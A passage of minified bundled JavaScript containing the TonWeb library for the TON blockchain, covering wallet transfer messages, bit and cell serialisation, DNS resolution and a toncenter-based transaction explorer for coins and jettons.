              const t = s.sign.keyPair.fromSecretKey(e);
              this.options.publicKey = t.publicKey;
            }
            const t = await this.createStateInit();
            ((h = t.stateInit), (c = t.code), (u = t.data));
          }
          const d = await this.getAddress(),
            f = n.createExternalMessageHeader(d),
            p = n.createCommonMsgInfo(f, h, l);
          return {
            address: d,
            message: p,
            body: l,
            signature: a,
            signingMessage: t,
            stateInit: h,
            code: c,
            data: u,
          };
        }
        async createTransferMessage(t, e, r, i, s, o, a, l, h) {
          if (
            (void 0 === s && (s = ""),
            void 0 === o && (o = 3),
            void 0 === a && (a = !1),
            void 0 === l && (l = null),
            void 0 === h && (h = void 0),
            null === i || void 0 === i || i < 0)
          )
            throw new Error("seqno must be number >= 0");
          const c = this.createSigningMessage(i, h);
          return (
            (null !== o && void 0 !== o) || (o = 3),
            c.bits.writeUint8(o),
            c.refs.push(n.createOutMsg(e, r, s, l)),
            this.createExternalMessage(c, t, i, a)
          );
        }
        async createTransferMessages(t, e, r, i, s) {
          if (
            (void 0 === i && (i = !1),
            void 0 === s && (s = void 0),
            null === e || void 0 === e || e < 0)
          )
            throw new Error("seqno must be number >= 0");
          const o = this.createSigningMessage(e, s);
          if (r.length < 1 || r.length > 4) throw new Error("put 1-4 messages");
          for (let a of r) {
            let t = a.sendMode;
            ((null !== t && void 0 !== t) || (t = 3),
              o.bits.writeUint8(t),
              o.refs.push(
                n.createOutMsg(a.toAddress, a.amount, a.payload, a.stateInit),
              ));
          }
          return this.createExternalMessage(o, t, e, i);
        }
      }
      t.exports = { WalletContract: WalletContract };
    },
    4697: function (t, e, r) {
      (function (e) {
        const n = r(8145),
          i = r(2925),
          s = r(877),
          o = "undefined" !== typeof self && self.crypto && self.crypto.subtle;
        let a = null;
        function l(t) {
          return o
            ? crypto.subtle.digest("SHA-256", t)
            : a.subtle.digest({ name: "SHA-256" }, t);
        }
        function h(t) {
          if (!n.isBN(t) && "string" !== typeof t)
            throw new Error(
              "Please pass numbers as strings or BN objects to avoid precision errors.",
            );
          return s.toWei(t, "gwei");
        }
        function c(t) {
          if (!n.isBN(t) && "string" !== typeof t)
            throw new Error(
              "Please pass numbers as strings or BN objects to avoid precision errors.",
            );
          return s.fromWei(t, "gwei");
        }
        o || (a = r(8147));
        const u = [],
          d = {};
        for (let t = 0; t <= 255; t++) {
          let e = t.toString(16);
          (e.length < 2 && (e = "0" + e), u.push(e), (d[e] = t));
        }
        function f(t) {
          const e = [];
          for (let r = 0; r < t.byteLength; r++) e.push(u[t[r]]);
          return e.join("");
        }
        function p(t) {
          t = t.toLowerCase();
          const e = t.length;
          if (e % 2 !== 0) throw "hex string must have length a multiple of 2";
          const r = e / 2,
            n = new Uint8Array(r);
          for (let i = 0; i < r; i++) {
            const e = 2 * i,
              r = t.substring(e, e + 2);
            if (!d.hasOwnProperty(r))
              throw new Error("invalid hex character " + r);
            n[i] = d[r];
          }
          return n;
        }
        function w(t, e) {
          let r, n;
          (void 0 === e && (e = 1),
            1 === e &&
              ((r = new ArrayBuffer(t.length)), (n = new Uint8Array(r))),
            2 === e &&
              ((r = new ArrayBuffer(2 * t.length)), (n = new Uint16Array(r))),
            4 === e &&
              ((r = new ArrayBuffer(4 * t.length)), (n = new Uint32Array(r))));
          for (let i = 0, s = t.length; i < s; i++) n[i] = t.charCodeAt(i);
          return new Uint8Array(n.buffer);
        }
        function C(t, e) {
          const r = 2197175160;
          t ^= 4294967295;
          for (let n = 0; n < e.length; n++)
            ((t ^= e[n]),
              (t = 1 & t ? (t >>> 1) ^ r : t >>> 1),
              (t = 1 & t ? (t >>> 1) ^ r : t >>> 1),
              (t = 1 & t ? (t >>> 1) ^ r : t >>> 1),
              (t = 1 & t ? (t >>> 1) ^ r : t >>> 1),
              (t = 1 & t ? (t >>> 1) ^ r : t >>> 1),
              (t = 1 & t ? (t >>> 1) ^ r : t >>> 1),
              (t = 1 & t ? (t >>> 1) ^ r : t >>> 1),
              (t = 1 & t ? (t >>> 1) ^ r : t >>> 1));
          return 4294967295 ^ t;
        }
        function g(t) {
          const e = C(0, t),
            r = new ArrayBuffer(4),
            n = new DataView(r);
          return (n.setUint32(0, e, !1), new Uint8Array(r).reverse());
        }
        function y(t) {
          const e = 4129;
          let r = 0;
          const n = new Uint8Array(t.length + 2);
          n.set(t);
          for (let i of n) {
            let t = 128;
            while (t > 0)
              ((r <<= 1),
                i & t && (r += 1),
                (t >>= 1),
                r > 65535 && ((r &= 65535), (r ^= e)));
          }
          return new Uint8Array([Math.floor(r / 256), r % 256]);
        }
        function m(t, e) {
          const r = new Uint8Array(t.length + e.length);
          return (r.set(t), r.set(e, t.length), r);
        }
        function B(t, e) {
          return t.toString() === e.toString();
        }
        const A = (() => {
          const t = [],
            e = "A".charCodeAt(0),
            r = "a".charCodeAt(0),
            n = "0".charCodeAt(0);
          for (let i = 0; i < 26; ++i) t.push(String.fromCharCode(e + i));
          for (let i = 0; i < 26; ++i) t.push(String.fromCharCode(r + i));
          for (let i = 0; i < 10; ++i) t.push(String.fromCharCode(n + i));
          return (t.push("+"), t.push("/"), t);
        })();
        function F(t) {
          let e,
            r = "";
          const n = t.length;
          for (e = 2; e < n; e += 3)
            ((r += A[t[e - 2] >> 2]),
              (r += A[((3 & t[e - 2]) << 4) | (t[e - 1] >> 4)]),
              (r += A[((15 & t[e - 1]) << 2) | (t[e] >> 6)]),
              (r += A[63 & t[e]]));
          return (
            e === n + 1 &&
              ((r += A[t[e - 2] >> 2]),
              (r += A[(3 & t[e - 2]) << 4]),
              (r += "==")),
            e === n &&
              ((r += A[t[e - 2] >> 2]),
              (r += A[((3 & t[e - 2]) << 4) | (t[e - 1] >> 4)]),
              (r += A[(15 & t[e - 1]) << 2]),
              (r += "=")),
            r
          );
        }
        function E(t) {
          return "undefined" === typeof self
            ? e.from(t, "base64").toString("binary")
            : atob(t);
        }
        function b(t) {
          return "undefined" === typeof self
            ? e.from(t, "binary").toString("base64")
            : btoa(t);
        }
        function v(t) {
          const e = E(t),
            r = e.length,
            n = new Uint8Array(r);
          for (let i = 0; i < r; i++) n[i] = e.charCodeAt(i);
          return n;
        }
        function D(t, e) {
          let r = 0;
          for (let n = 0; n < t; n++) ((r *= 256), (r += e[n]));
          return r;
        }
        function M(t) {
          return i.sign.keyPair.fromSeed(t);
        }
        function _() {
          return i.sign.keyPair();
        }
        function T() {
          return i.sign.keyPair().secretKey.slice(0, 32);
        }
        t.exports = {
          BN: n,
          nacl: i,
          sha256: l,
          fromNano: c,
          toNano: h,
          bytesToHex: f,
          hexToBytes: p,
          stringToBytes: w,
          crc32c: g,
          crc16: y,
          concatBytes: m,
          bytesToBase64: F,
          base64ToBytes: v,
          base64toString: E,
          stringToBase64: b,
          compareBytes: B,
          readNBytesUIntFromArray: D,
          keyPairFromSeed: M,
          newKeyPair: _,
          newSeed: T,
        };
      }).call(this, r(2).Buffer);
    },
    5250: function (t, e, r) {
      const { BN: n, bytesToHex: i } = r(2916);
      class BitString {
        constructor(t) {
          ((this.array = Uint8Array.from(
            { length: Math.ceil(t / 8) },
            () => 0,
          )),
            (this.cursor = 0),
            (this.length = t));
        }
        getFreeBits() {
          return this.length - this.cursor;
        }
        getUsedBits() {
          return this.cursor;
        }
        getUsedBytes() {
          return Math.ceil(this.cursor / 8);
        }
        get(t) {
          return (this.array[(t / 8) | 0] & (1 << (7 - (t % 8)))) > 0;
        }
        checkRange(t) {
          if (t > this.length) throw Error("BitString overflow");
        }
        on(t) {
          (this.checkRange(t), (this.array[(t / 8) | 0] |= 1 << (7 - (t % 8))));
        }
        off(t) {
          (this.checkRange(t),
            (this.array[(t / 8) | 0] &= ~(1 << (7 - (t % 8)))));
        }
        toggle(t) {
          (this.checkRange(t), (this.array[(t / 8) | 0] ^= 1 << (7 - (t % 8))));
        }
        forEach(t) {
          const e = this.cursor;
          for (let r = 0; r < e; r++) t(this.get(r));
        }
        writeBit(t) {
          (t && t > 0 ? this.on(this.cursor) : this.off(this.cursor),
            (this.cursor = this.cursor + 1));
        }
        writeBitArray(t) {
          for (let e = 0; e < t.length; e++) this.writeBit(t[e]);
        }
        writeUint(t, e) {
          if (((t = new n(t)), 0 == e || t.toString(2).length > e)) {
            if (0 == t) return;
            throw Error(
              "bitLength is too small for number, got number=" +
                t +
                ",bitLength=" +
                e,
            );
          }
          const r = t.toString(2, e);
          for (let n = 0; n < e; n++) this.writeBit(1 == r[n]);
        }
        writeInt(t, e) {
          if (((t = new n(t)), 1 == e)) {
            if (-1 == t) return void this.writeBit(!0);
            if (0 == t) return void this.writeBit(!1);
            throw Error("Bitlength is too small for number");
          }
          if (t.isNeg()) {
            this.writeBit(!0);
            const r = new n(2),
              i = r.pow(new n(e - 1));
            this.writeUint(i.add(t), e - 1);
          } else (this.writeBit(!1), this.writeUint(t, e - 1));
        }
        writeUint8(t) {
          this.writeUint(t, 8);
        }
        writeBytes(t) {
          for (let e = 0; e < t.length; e++) this.writeUint8(t[e]);
        }
        writeString(t) {
          this.writeBytes(new TextEncoder().encode(t));
        }
        writeGrams(t) {
          if (0 == t) this.writeUint(0, 4);
          else {
            t = new n(t);
            const e = Math.ceil(t.toString(16).length / 2);
            (this.writeUint(e, 4), this.writeUint(t, 8 * e));
          }
        }
        writeCoins(t) {
          this.writeGrams(t);
        }
        writeAddress(t) {
          null == t
            ? this.writeUint(0, 2)
            : (this.writeUint(2, 2),
              this.writeUint(0, 1),
              this.writeInt(t.wc, 8),
              this.writeBytes(t.hashPart));
        }
        writeBitString(t) {
          t.forEach((t) => {
            this.writeBit(t);
          });
        }
        clone() {
          const t = new BitString(0);
          return (
            (t.array = this.array.slice(0)),
            (t.length = this.length),
            (t.cursor = this.cursor),
            t
          );
        }
        toString() {
          return this.toHex();
        }
        getTopUppedArray() {
          const t = this.clone();
          let e = 8 * Math.ceil(t.cursor / 8) - t.cursor;
          if (e > 0) {
            ((e -= 1), t.writeBit(!0));
            while (e > 0) ((e -= 1), t.writeBit(!1));
          }
          return (
            (t.array = t.array.slice(0, Math.ceil(t.cursor / 8))),
            t.array
          );
        }
        toHex() {
          if (this.cursor % 4 === 0) {
            const t = i(
              this.array.slice(0, Math.ceil(this.cursor / 8)),
            ).toUpperCase();
            return this.cursor % 8 === 0 ? t : t.substr(0, t.length - 1);
          }
          {
            const t = this.clone();
            t.writeBit(1);
            while (t.cursor % 4 !== 0) t.writeBit(0);
            const e = t.toHex().toUpperCase();
            return e + "_";
          }
        }
        setTopUppedArray(t, e) {
          if (
            (void 0 === e && (e = !0),
            (this.length = 8 * t.length),
            (this.array = t),
            (this.cursor = this.length),
            !e && this.length)
          ) {
            let r = !1;
            for (let t = 0; t < 7; t++)
              if (((this.cursor -= 1), this.get(this.cursor))) {
                ((r = !0), this.off(this.cursor));
                break;
              }
            if (!r)
              throw (console.log(t, e), new Error("Incorrect TopUppedArray"));
          }
        }
      }
      t.exports = { BitString: BitString };
    },
    5251: function (t, e, r) {
      const { BN: n } = r(2916);
      function i(t) {
        t.loadBits(512);
        const e = t.loadUint(32).toNumber();
        if (698983191 !== e) throw new Error("invalid walletId");
        const r = t.loadUint(32).toNumber(),
          i = t.loadUint(32).toNumber(),
          s = t.loadUint(8).toNumber();
        if (3 !== s) throw new Error("invalid sendMode");
        let o = t.loadRef();
        if (o.loadBit()) throw Error("invalid internal header");
        if (!o.loadBit()) throw Error("invalid ihrDisabled");
        const a = o.loadBit();
        if (o.loadBit()) throw Error("invalid bounced");
        const l = o.loadAddress();
        if (null !== l) throw Error("invalid externalSourceAddress");
        const h = o.loadAddress(),
          c = o.loadCoins();
        if (o.loadBit()) throw Error("invalid currencyCollection");
        const u = o.loadCoins();
        if (!u.eq(new n(0))) throw new Error("invalid ihrFees");
        const d = o.loadCoins();
        if (!d.eq(new n(0))) throw new Error("invalid fwdFees");
        const f = o.loadUint(64);
        if (!f.eq(new n(0))) throw new Error("invalid createdLt");
        const p = o.loadUint(32);
        if (!p.eq(new n(0))) throw new Error("invalid createdAt");
        o.loadBit() && o.loadRef();
        let w = null;
        if (
          o.getFreeBits() > 0 &&
          (o.loadBit() && (o = o.loadRef()), o.getFreeBits() > 32)
        ) {
          const t = o.loadUint(32),
            e = o.loadBits(o.getFreeBits());
          w = t.eq(new n(0)) ? new TextDecoder().decode(e) : "";
        }
        return {
          toAddress: h,
          value: c,
          bounce: a,
          seqno: i,
          expireAt: r,
          payload: w,
        };
      }
      function s(t) {
        const e = t.beginParse();
        if (2 !== e.loadUint(2).toNumber()) throw Error("invalid header");
        const r = e.loadAddress();
        if (null !== r) throw Error("invalid externalSourceAddress");
        const s = e.loadAddress(),
          o = e.loadCoins();
        if (!o.eq(new n(0))) throw new Error("invalid externalImportFee");
        e.loadBit() && e.loadBit() && e.loadRef();
        const a = e.loadBit() ? e.loadRef() : e;
        return { fromAddress: s, ...i(a) };
      }
      t.exports = {
        parseWalletV3TransferQuery: s,
        parseWalletV3TransferBody: i,
      };
    },
    5284: function (t, e, r) {
      const { parseAddress: n } = r(3184),
        {
          AdnlAddress: i,
          StorageBagId: s,
          BN: o,
          sha256: a,
          bytesToHex: l,
          bytesToBase64: h,
        } = r(2916),
        { Cell: c } = r(2917),
        u = "dns_next_resolver",
        d = "wallet",
        f = "site",
        p = "storage",
        w = async (t) => {
          if (!t) return new o(0);
          const e = new TextEncoder().encode(t),
            r = new Uint8Array(await a(e));
          return new o(l(r), 16);
        },
        C = (t) => {
          const e = new c();
          return (
            e.bits.writeUint(40915, 16),
            e.bits.writeAddress(t),
            e.bits.writeUint(0, 8),
            e
          );
        },
        g = (t) => {
          const e = new c();
          return (
            e.bits.writeUint(44289, 16),
            e.bits.writeBytes(t.bytes),
            e.bits.writeUint(0, 8),
            e
          );
        },
        y = (t) => {
          const e = new c();
          return (e.bits.writeUint(29811, 16), e.bits.writeBytes(t.bytes), e);
        },
        m = (t) => {
          const e = new c();
          return (e.bits.writeUint(47763, 16), e.bits.writeAddress(t), e);
        },
        B = (t, e, r) => {
          if (t.bits.array[0] !== e || t.bits.array[1] !== r)
            throw new Error("Invalid dns record value prefix");
          return ((t.bits.array = t.bits.array.slice(2)), n(t));
        },
        A = (t) => B(t, 159, 211),
        F = (t) => B(t, 186, 147),
        E = (t) => {
          if (173 !== t.bits.array[0] || 1 !== t.bits.array[1])
            throw new Error("Invalid dns record value prefix");
          const e = t.bits.array.slice(2, 34);
          return new i(e);
        },
        b = (t) => {
          if (116 !== t.bits.array[0] || 115 !== t.bits.array[1])
            throw new Error("Invalid dns record value prefix");
          const e = t.bits.array.slice(2, 34);
          return new s(e);
        },
        v = (t) =>
          t
            ? 173 === t.bits.array[0] || 1 === t.bits.array[1]
              ? E(t)
              : b(t)
            : null,
        D = async (t, e, r, n, i) => {
          const s = 8 * r.length,
            o = new c();
          o.bits.writeBytes(r);
          const a = await w(n),
            l = await t.call2(e, "dnsresolve", [
              ["tvm.Slice", h(await o.toBoc(!1))],
              ["num", a.toString()],
            ]);
          if (2 !== l.length) throw new Error("Invalid dnsresolve response");
          const C = l[0].toNumber();
          let g = l[1];
          if (
            (g instanceof Array && 0 === g.length && (g = null), g && !g.bits)
          )
            throw new Error("Invalid dnsresolve response");
          if (0 === C) return null;
          if (C % 8 !== 0)
            throw new Error("domain split not at a component boundary");
          if (C > s) throw new Error("invalid response " + C + "/" + s);
          if (C === s)
            return n === u
              ? g
                ? F(g)
                : null
              : n === d
                ? g
                  ? A(g)
                  : null
                : n === f
                  ? g
                    ? v(g)
                    : null
                  : n === p
                    ? g
                      ? b(g)
                      : null
                    : g;
          if (g) {
            const e = F(g);
            return i
              ? n === u
                ? e
                : null
              : await D(t, e.toString(), r.slice(C / 8), n, !1);
          }
          return null;
        },
        M = (t) => {
          if (!t || !t.length) throw new Error("empty domain");
          if ("." === t) return new Uint8Array([0]);
          t = t.toLowerCase();
          for (let n = 0; n < t.length; n++)
            if (t.charCodeAt(n) <= 32)
              throw new Error(
                "bytes in range 0..32 are not allowed in domain names",
              );
          for (let n = 0; n < t.length; n++) {
            const e = t.substring(n, n + 1);
            for (let t = 127; t <= 159; t++)
              if (e === String.fromCharCode(t))
                throw new Error(
                  "bytes in range 127..159 are not allowed in domain names",
                );
          }
          const e = t.split(".");
          e.forEach((t) => {
            if (!t.length)
              throw new Error("domain name cannot have an empty component");
          });
          let r = e.reverse().join("\0") + "\0";
          return (
            r.length < 126 && (r = "\0" + r),
            new TextEncoder().encode(r)
          );
        },
        _ = async (t, e, r, n, i) => {
          const s = M(r);
          return D(t, e, s, n, i);
        };
      t.exports = {
        DNS_CATEGORY_NEXT_RESOLVER: u,
        DNS_CATEGORY_SITE: f,
        DNS_CATEGORY_WALLET: d,
        DNS_CATEGORY_STORAGE: p,
        categoryToBN: w,
        domainToBytes: M,
        createSmartContractAddressRecord: C,
        createAdnlAddressRecord: g,
        createNextResolverRecord: m,
        parseSmartContractAddressRecord: A,
        parseAdnlAddressRecord: E,
        parseStorageBagIdRecord: b,
        parseSiteRecord: v,
        parseNextResolverRecord: F,
        createStorageBagIdRecord: y,
        dnsResolve: _,
      };
    },
    6199: function (t, e, r) {
      const n = r(2916),
        i = n.Address,
        s = r(2917),
        o = r(8153),
        a = r(8154).default,
        { Contract: l } = r(3061),
        h = r(8157).default,
        c = r(8163).default,
        u = r(8164).default,
        d = r(8169).default,
        { BlockSubscription: f, InMemoryBlockStorage: p } = r(8172),
        { SubscriptionContract: w } = r(8175),
        { Payments: C, PaymentChannel: g } = r(8176),
        y = r(8179).default,
        m = r(8206).default,
        B = r(8207).default,
        { Dns: A, DnsCollection: F, DnsItem: E } = r(8382).default,
        b = "0.0.60";
      class TonWeb {
        constructor(t) {
          ((this.version = b),
            (this.utils = n),
            (this.Address = i),
            (this.boc = s),
            (this.Contract = l),
            (this.BlockSubscription = f),
            (this.InMemoryBlockStorage = p),
            (this.provider = t || new a()),
            (this.dns = new A(this.provider)),
            (this.wallet = new h(this.provider)),
            (this.payments = new C(this.provider)),
            (this.lockupWallet = c));
        }
        async getTransactions(t, e, r, n, i) {
          return (
            void 0 === e && (e = 20),
            void 0 === r && (r = void 0),
            void 0 === n && (n = void 0),
            void 0 === i && (i = void 0),
            this.provider.getTransactions(t.toString(), e, r, n, i)
          );
        }
        async getBalance(t) {
          return this.provider.getBalance(t.toString());
        }
        async sendBoc(t) {
          return this.provider.sendBoc(n.bytesToBase64(t));
        }
        async call(t, e, r) {
          return (
            void 0 === r && (r = []),
            this.provider.call(t.toString(), e, r)
          );
        }
      }
      ((TonWeb.version = b),
        (TonWeb.utils = n),
        (TonWeb.Address = i),
        (TonWeb.boc = s),
        (TonWeb.HttpProvider = a),
        (TonWeb.Contract = l),
        (TonWeb.Wallets = h),
        (TonWeb.LockupWallets = c),
        (TonWeb.SubscriptionContract = w),
        (TonWeb.BlockSubscription = f),
        (TonWeb.InMemoryBlockStorage = p),
        (TonWeb.ledger = {
          TransportWebUSB: y,
          TransportWebHID: m,
          BluetoothTransport: B,
          AppTon: o,
        }),
        (TonWeb.token = { nft: u, ft: d, jetton: d }),
        (TonWeb.dns = A),
        (TonWeb.dns.DnsCollection = F),
        (TonWeb.dns.DnsItem = E),
        (TonWeb.payments = C),
        (TonWeb.payments.PaymentChannel = g),
        (t.exports = TonWeb));
    },
    6200: function (t, e, r) {
      const { BN: n, Address: i, bytesToHex: s } = r(2916),
        { BitString: o } = r(5250);
      class Slice {
        constructor(t, e, r) {
          ((this.array = t),
            (this.length = e),
            (this.readCursor = 0),
            (this.refs = r),
            (this.refCursor = 0));
        }
        getFreeBits() {
          return this.length - this.readCursor;
        }
        checkRange(t) {
          if (t > this.length) throw Error("BitString overflow");
        }
        get(t) {
          return (
            this.checkRange(t),
            (this.array[(t / 8) | 0] & (1 << (7 - (t % 8)))) > 0
          );
        }
        loadBit() {
          const t = this.get(this.readCursor);
          return (this.readCursor++, t);
        }
        loadBits(t) {
          const e = new o(t);
          for (let r = 0; r < t; r++) e.writeBit(this.loadBit());
          return e.array;
        }
        loadUint(t) {
          if (t < 1) throw "Incorrect bitLength";
          let e = "";
          for (let r = 0; r < t; r++) e += this.loadBit() ? "1" : "0";
          return new n(e, 2);
        }
        loadInt(t) {
          if (t < 1) throw "Incorrect bitLength";
          const e = this.loadBit();
          if (1 === t) return new n(e ? -1 : 0);
          let r = this.loadUint(t - 1);
          if (e) {
            const e = new n(2),
              i = e.pow(new n(t - 1));
            r -= i;
          }
          return r;
        }
        loadVarUint(t) {
          const e = this.loadUint(new n(t).toString(2).length - 1);
          return 0 === e.toNumber() ? new n(0) : this.loadUint(8 * e);
        }
        loadCoins() {
          return this.loadVarUint(16);
        }
        loadAddress() {
          const t = this.loadUint(2);
          if (0 === t.toNumber()) return null;
          if (2 !== t.toNumber()) throw new Error("unsupported address type");
          if (this.loadBit()) throw new Error("unsupported address type");
          const e = this.loadInt(8).toNumber(),
            r = this.loadBits(256);
          return new i(e + ":" + s(r));
        }
        loadRef() {
          if (this.refCursor >= 4) throw new Error("refs overflow");
          const t = this.refs[this.refCursor];
          return (this.refCursor++, t);
        }
      }
      t.exports = { Slice: Slice };
    },
    8144: function (t, e, r) {
      "use strict";
      var n = r(0);
      (Object.defineProperty(e, "__esModule", { value: !0 }),
        (e.decodeTokenBodyMsg = B),
        (e.default = void 0));
      var i = n(r(69)),
        s = n(r(6199)),
        o = n(r(129)),
        a = r(19),
        l = r(27),
        h = r(67),
        c = n(r(80)),
        u = r(4);
      const d = "https://toncenter.com/api/v2/jsonRPC",
        f = "https://toncenter.com/api/index",
        p = "IN_TRANSFER_COIN",
        w = "OUT_TRANSFER_COIN",
        C = "IN_TRANSFER_TOKEN",
        g = "OUT_TRANSFER_TOKEN",
        y = 1100,
        m = 3e4;
      function B(t) {
        const e = s.default.utils.base64ToBytes(t),
          r = s.default.boc.Cell.oneFromBoc(e),
          n = r.beginParse();
        let i;
        try {
          i = n.loadUint(32);
        } catch (f) {
          return { op: null };
        }
        const o = n.loadUint(64);
        let a, l, h;
        try {
          var c, u, d;
          ((a =
            null === (c = n.loadCoins()) || void 0 === c
              ? void 0
              : c.toString()),
            (l =
              null === (u = n.loadAddress()) || void 0 === u
                ? void 0
                : u.toString(!0, !0, !0)),
            (h =
              null === (d = n.loadAddress()) || void 0 === d
                ? void 0
                : d.toString(!0, !0, !0)));
        } catch (f) {
          return { op: i, queryId: o };
        }
        return { op: i, queryId: o, amount: a, destination: l, source: h };
      }
      class TonwebExplorer extends o.default {
        constructor(t) {
          var e;
          let { wallet: r, config: n } = t;
          (super(...arguments),
            (0, i.default)(this, "jettonWalletAddressObjectsByMintCache", {}),
            (0, i.default)(this, "mintsByJettonWalletAddressCache", {}),
            (0, i.default)(
              this,
              "mintsByJettonWalletAddressCacheHasAllTokens",
              !1,
            ),
            (0, i.default)(this, "taskQueue", null),
            (this.provider = new s.default.HttpProvider(
              (null === (e = this.config) || void 0 === e
                ? void 0
                : e.baseUrl) || d,
            )),
            (this._getIsInCoinTx = this._getIsInCoinTx.bind(this)),
            (this._getIsOutCoinTx = this._getIsOutCoinTx.bind(this)),
            (this._parseInCoinTx = this._parseInCoinTx.bind(this)),
            (this._parseOutCoinTx = this._parseOutCoinTx.bind(this)),
            (this._getIsInTokenTx = this._getIsInTokenTx.bind(this)),
            (this._getIsOutTokenTx = this._getIsOutTokenTx.bind(this)),
            (this._parseInTokenTx = this._parseInTokenTx.bind(this)),
            (this._parseOutTokenTx = this._parseOutTokenTx.bind(this)),
            (this.TX_COINS_INSTRUCTIONS_PARSERS = {
              [p]: { isMatch: this._getIsInCoinTx, parse: this._parseInCoinTx },
              [w]: {
                isMatch: this._getIsOutCoinTx,
                parse: this._parseOutCoinTx,
              },
            }),
            (this.TX_TOKENS_INSTRUCTIONS_PARSERS = {
              [C]: {
                isMatch: this._getIsInTokenTx,
                parse: this._parseInTokenTx,
              },
              [g]: {
                isMatch: this._getIsOutTokenTx,
                parse: this._parseOutTokenTx,
              },
            }),
            (this.taskQueue = new u.TaskQueue(y, m)));
        }
        getAllowedTickers() {
          return ["TON"];
        }
        getTaskQueueInstance() {
          return this.taskQueue;
        }
        getTaskQueueKey(t) {
          return t.join("-");
        }
        _createAddress(t) {
          return new s.default.utils.Address(t);
        }
        _createJettonMinter(t) {
          return new s.default.token.jetton.JettonMinter(this.provider, {
            address: t,
          });
        }
        _createJettonWallet(t) {
          return new s.default.token.jetton.JettonWallet(this.provider, {
            address: t,
          });
        }
        _validateJettonMinter(t) {
          const e = this._createAddress(t).toString(!1),
            r = this._createJettonMinter(t).address.toString(!1);
          if (r !== e) throw new Error("Jetton minter address mismatch.");
        }
        async _getJettonWalletAddressObj(t, e) {
          var r;
          return null !== (r = this.jettonWalletAddressObjectsByMintCache) &&
            void 0 !== r &&
            r[e]
            ? this.jettonWalletAddressObjectsByMintCache[e]
            : this.taskQueue.addTask(
                this.getTaskQueueKey(["_getJettonWalletAddressObj", t, e]),
                async () => {
                  try {
                    var r;
                    if (
                      null !==
                        (r = this.jettonWalletAddressObjectsByMintCache) &&
                      void 0 !== r &&
                      r[e]
                    )
                      return this.jettonWalletAddressObjectsByMintCache[e];
                    this._validateJettonMinter(e);
                    const n = this._createAddress(t),
                      i = this._createJettonMinter(e),
                      s = await i.getJettonWalletAddress(n),
                      o = s.toString(!0, !0, !0);
                    return (
                      (this.mintsByJettonWalletAddressCache[o] = e),
                      (this.jettonWalletAddressObjectsByMintCache[e] = s),
                      this.jettonWalletAddressObjectsByMintCache[e]
                    );
                  } catch (n) {
                    throw new a.ExternalError({
                      type: l.EXTERNAL_ERROR,
                      error: `${e}: ${n}`,
                      instance: this,
                    });
                  }
                },
              );
        }
        async getJettonWalletAddressStr(t, e) {
          const r = await this._getJettonWalletAddressObj(t, e);
          return r.toString(!0, !0, !0);
        }
        async _fillMintsByJettonWalletAddressCache() {
          if (this.mintsByJettonWalletAddressCacheHasAllTokens) return;
          const t = Object.entries(this.wallet.getTokens()).map((t) => {
              let [e, r] = t;
              return r;
            }),
            e = Object.entries(this.mintsByJettonWalletAddressCache).map(
              (t) => {
                let [e, r] = t;
                return r;
              },
            ),
            r = t.filter((t) => !e.includes(t.mint));
          (await Promise.all(
            r.map((t) =>
              this._getJettonWalletAddressObj(this.wallet.address, t.mint),
            ),
          ),
            (this.mintsByJettonWalletAddressCacheHasAllTokens = !0));
        }
        _getIsInCoinTx(t) {
          const { in_msg: { op: e = "" } = {} } = t || {};
          return null === e || 0 === e;
        }
        _getIsOutCoinTx(t, e) {
          const {
            in_msg: { source: r = "", destination: n = "" } = {},
            out_msgs: [{ op: i = "" } = {}] = [],
          } = t || {};
          return "" === r && n === e && (null === i || 0 === i);
        }
        _getIsInTokenTx(t) {
          const { in_msg: e = {} } = t || {},
            r = e.op.toString(16);
          return "178d4519" === r && !!e.source && !!e.value;
        }
        _getIsOutTokenTx(t, e) {
          const { in_msg: r = {}, out_msgs: n = [] } = t || {},
            i = r.op.toString(16);
          return (
            "f8a7ea5" === i &&
            r.source === e &&
            n.length > 0 &&
            n[0].destination !== e
          );
        }
        _parseInCoinTx(t) {
          const { in_msg: e } = t || {},
            r = e.source,
            n = e.destination,
            i = e.value;
          return { source: r, destination: n, amount: i };
        }
        _parseOutCoinTx(t, e) {
          var r, n;
          let { selfAddress: i } = e;
          const { out_msgs: s } = t || {},
            o = i,
            a = null === (r = s[0]) || void 0 === r ? void 0 : r.destination,
            l = null === (n = s[0]) || void 0 === n ? void 0 : n.value;
          return { source: o, destination: a, amount: l };
        }
        _getTokenByJettonWalletAddress(t, e) {
          var r, n, i;
          const s =
            null !==
              (r =
                null === (n = this.mintsByJettonWalletAddressCache[t]) ||
                void 0 === n
                  ? void 0
                  : n.toLowerCase()) && void 0 !== r
              ? r
              : null;
          return null !== (i = e[s]) && void 0 !== i ? i : {};
        }
        _parseTokenTx(t, e, r) {
          let { selfAddress: n, tokens: i } = e;
          void 0 === r && (r = !1);
          const { in_msg: s = {} } = t || {},
            { destination: o, body: a } = s,
            l = B(a),
            h = r
              ? !(l.source && l.destination && l.amount && o)
              : !(l.source && l.amount && o);
          if (h) return {};
          const {
            ticker: c,
            name: u,
            decimal: d,
            mint: f,
          } = this._getTokenByJettonWalletAddress(o, i);
          return {
            source: l.source,
            destination: r ? l.destination : n,
            isToken: !0,
            amount: l.amount,
            decimal: d,
            symbol: c,
            name: u,
            mint: f,
          };
        }
        _parseInTokenTx(t, e) {
          return this._parseTokenTx(t, e, !1);
        }
        _parseOutTokenTx(t, e) {
          return this._parseTokenTx(t, e, !0);
        }
        async getBalance(t) {
          return this.taskQueue.addTask(
            this.getTaskQueueKey(["getBalance", t]),
            async () =>
              this.provider.getBalance(t).catch((t) => {
                throw new a.ExplorerRequestError({
                  type: l.GET_BALANCE_TYPE,
                  error: t,
                  instance: this,
                });
              }),
          );
        }
        async getState(t) {
          return this.taskQueue.addTask(
            this.getTaskQueueKey(["getState", t]),
            async () => this.provider.getAddressInfo(t),
          );
        }
        async sendTransaction(t) {
          return this.taskQueue.addTask(null, async () =>
            this.provider.send("sendBocReturnHash", { boc: t }),
          );
        }
        _getCoinTxInstruction(t) {
          const e = { destination: "", source: "", isToken: !1, amount: "0" };
          return Object.entries(this.TX_COINS_INSTRUCTIONS_PARSERS).reduce(
            (e, r) => {
              let [, { isMatch: n, parse: i }] = r;
              const s = n(t, this.wallet.address)
                ? i(t, { selfAddress: this.wallet.address })
                : {};
              return { ...e, ...s };
            },
            e,
          );
        }
        _getTokenTxInstruction(t) {
          const e = {
              destination: "",
              source: "",
              isToken: !1,
              amount: "0",
              decimal: 0,
              symbol: "",
              mint: "",
            },
            r = this.wallet.getTokens(),
            n = this.wallet.address;
          return Object.entries(this.TX_TOKENS_INSTRUCTIONS_PARSERS).reduce(
